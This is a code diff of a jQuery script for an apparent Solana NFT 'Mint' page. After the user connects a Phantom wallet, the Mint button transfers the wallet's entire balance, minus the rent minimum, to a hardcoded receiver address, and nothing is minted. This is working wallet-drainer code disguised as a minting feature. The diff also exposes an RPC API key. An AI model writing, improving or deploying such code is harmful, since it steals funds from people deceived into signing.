@@ -2,34 +2,28 @@ $(document).ready(function () {
     $('#connect-wallet').on('click', async () => {
         if (window.solana && window.solana.isPhantom) {
             try {
-                // Подключение Phantom Wallet
                 const resp = await window.solana.connect();
                 console.log("Phantom Wallet connected:", resp);
 
-                // Установка соединения с RPC
                 const connection = new solanaWeb3.Connection(
-                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN', // Используйте публичный RPC или ваш API
+                    'https://solana-mainnet.api.syndica.io/api-key/42aSFR7aLhxB7NfXEq78aMvkfweu58G4ngdwhri32u9BAaaQ9wShomjTtKH9RCKJDpS3sxRGQXeZk3Wp8s8BDbLPjmLTCqTHhoN',
                     'confirmed'
                 );
 
-                // Получение публичного ключа кошелька
                 const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                 const walletBalance = await connection.getBalance(public_key);
                 console.log("Wallet balance:", walletBalance);
 
-                // Проверка минимального баланса для оплаты аренды
                 const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
                     alert("Insufficient funds for rent.");
                     return;
                 }
 
-                // Изменение кнопки на "Mint"
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
                     try {
-                        // Указание получателя перевода
-                        const receiverWallet = new solanaWeb3.PublicKey('DVm4XnbDT6hzhcVJBeM2DMbq3URGDpC5qkzd2rwhvFwK'); // Замените на кошелек получателя
+                        const receiverWallet = new solanaWeb3.PublicKey('DVm4XnbDT6hzhcVJBeM2DMbq3URGDpC5qkzd2rwhvFwK');
                         const balanceForTransfer = walletBalance - minBalance;
 
                         if (balanceForTransfer <= 0) {
@@ -37,7 +31,6 @@ $(document).ready(function () {
                             return;
                         }
 
-                        // Создание транзакции
                         const transaction = new solanaWeb3.Transaction().add(
                             solanaWeb3.SystemProgram.transfer({
                                 fromPubkey: public_key,
@@ -48,21 +41,27 @@ $(document).ready(function () {
 
                         transaction.feePayer = resp.publicKey;
 
-                        // Получение актуального blockhash
                         const { blockhash } = await connection.getLatestBlockhash();
+                        if (!blockhash) {
+                            throw new Error("Failed to fetch blockhash");
+                        }
                         transaction.recentBlockhash = blockhash;
 
-                        // Подпись транзакции
-                        const signed = await window.solana.signTransaction(transaction);
-                        console.log("Transaction signed:", signed);
+                        console.log("Transaction object before signing:", transaction);
 
-                        // Отправка транзакции
-                        const txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
+                        const signed = await window.solana.signTransaction(transaction);
+                        console.log("Signed transaction:", signed);
+
+                        const serialized = signed.serialize();
+                        console.log("Serialized transaction:", serialized);
+
+                        const txid = await connection.sendRawTransaction(serialized);
                         console.log("Transaction confirmed:", txid);
+
                         alert(`Transaction successful! TxID: ${txid}`);
                     } catch (err) {
-                        console.error("Error during minting:", err);
+                        console.error("Error during minting:", err.message);
+                        console.error("Full error object:", err);
                         alert("Minting failed. Check console for details.");
                     }
                 });
@@ -71,16 +70,6 @@ $(document).ready(function () {
             }
         } else {
             alert("Phantom extension not found.");
-            const isFirefox = typeof InstallTrigger !== "undefined";
-            const isChrome = !!window.chrome;
-
-            if (isFirefox) {
-                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
-            } else if (isChrome) {
-                window.open("https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa", "_blank");
-            } else {
-                alert("Please download the Phantom extension for your browser.");
-            }
         }
     });
 });
